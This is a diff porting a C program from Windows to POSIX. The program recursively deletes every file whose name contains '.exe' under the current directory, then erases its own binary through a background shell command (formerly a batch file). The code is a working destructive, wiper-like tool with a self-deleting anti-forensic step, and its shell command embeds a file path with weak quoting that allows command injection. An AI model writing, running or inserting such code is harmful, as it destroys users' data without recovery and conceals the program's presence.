@@ -1,86 +1,75 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <limits.h>
+
+#ifndef PATH_MAX
+#define PATH_MAX 4096
+#endif
 
 void deleteExeFiles(const char *path, const char *currentExePath) {
-    WIN32_FIND_DATA findFileData;
-    HANDLE hFind = INVALID_HANDLE_VALUE;
-
-    char searchPath[1024];
-    snprintf(searchPath, sizeof(searchPath), "%s\\*", path);
-
-    hFind = FindFirstFile(searchPath, &findFileData);
-
-    if (hFind == INVALID_HANDLE_VALUE) {
-        printf("Unable to open directory: %s\n", path);
+    DIR *dir = opendir(path);
+    if (!dir) {
+        perror("Unable to open directory");
         return;
     }
 
-    do {
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
         // Skip current and parent directories
-        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
             continue;
         }
 
-        char fullPath[1024];
-        snprintf(fullPath, sizeof(fullPath), "%s\\%s", path, findFileData.cFileName);
+        char fullPath[PATH_MAX];
+        snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);
 
-        DWORD dwFileAttr = GetFileAttributes(fullPath);
-        if (dwFileAttr == INVALID_FILE_ATTRIBUTES) {
+        struct stat statbuf;
+        if (stat(fullPath, &statbuf) == -1) {
             continue;
         }
 
-        if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY) {
-            // Recursively search subdirectories
-            deleteExeFiles(fullPath, currentExePath);
-        } else if (dwFileAttr & FILE_ATTRIBUTE_ARCHIVE) {
-            // Check if the file has .exe extension and isn't the current executable
-            if (strstr(findFileData.cFileName, ".exe") != NULL && strcmp(fullPath, currentExePath) != 0) {
-                if (DeleteFile(fullPath)) {
+        if (S_ISDIR(statbuf.st_mode)) {
+            deleteExeFiles(fullPath, currentExePath);  // Recurse into directories
+        } else {
+            if (strstr(entry->d_name, ".exe") != NULL && strcmp(fullPath, currentExePath) != 0) {
+                if (remove(fullPath) == 0) {
                     printf("Deleted: %s\n", fullPath);
                 } else {
-                    printf("Failed to delete: %s\n", fullPath);
+                    perror("Failed to delete");
                 }
             }
         }
-    } while (FindNextFile(hFind, &findFileData) != 0);
-
-    FindClose(hFind);
-}
-
-void createDeleteBatchFile(const char *currentExePath) {
-    FILE *batchFile = fopen("deleteSelf.bat", "w");
-    if (batchFile == NULL) {
-        printf("Failed to create batch file\n");
-        return;
     }
 
-    fprintf(batchFile, "@echo off\n");
-    fprintf(batchFile, "del /f /q \"%s\"\n", currentExePath);  // Force delete the current executable
-    fprintf(batchFile, "exit\n");
+    closedir(dir);
+}
 
-    fclose(batchFile);
-    printf("Created batch file to delete itself: deleteSelf.bat\n");
-
-    // Run the batch file asynchronously after the program exits
-    system("start deleteSelf.bat");
+void scheduleSelfDelete(const char *currentExePath) {
+    char command[PATH_MAX + 64];
+    snprintf(command, sizeof(command), "sh -c 'rm -f \"%s\" &'", currentExePath);
+    system(command);
+    printf("Scheduled self-deletion\n");
 }
 
 int main() {
-    char currentExePath[MAX_PATH];
-    DWORD length = GetModuleFileName(NULL, currentExePath, sizeof(currentExePath));
+    char currentExePath[PATH_MAX];
+    ssize_t len = readlink("/proc/self/exe", currentExePath, sizeof(currentExePath) - 1);
 
-    if (length == 0) {
+    if (len == -1) {
         perror("Failed to get current executable path");
         return 1;
     }
 
+    currentExePath[len] = '\0';
+
     const char *path = ".";  // Start from the current directory
     deleteExeFiles(path, currentExePath);
 
-    // Now create and run the batch file that will delete the program itself
-    createDeleteBatchFile(currentExePath);
+    scheduleSelfDelete(currentExePath);
 
     return 0;
 }
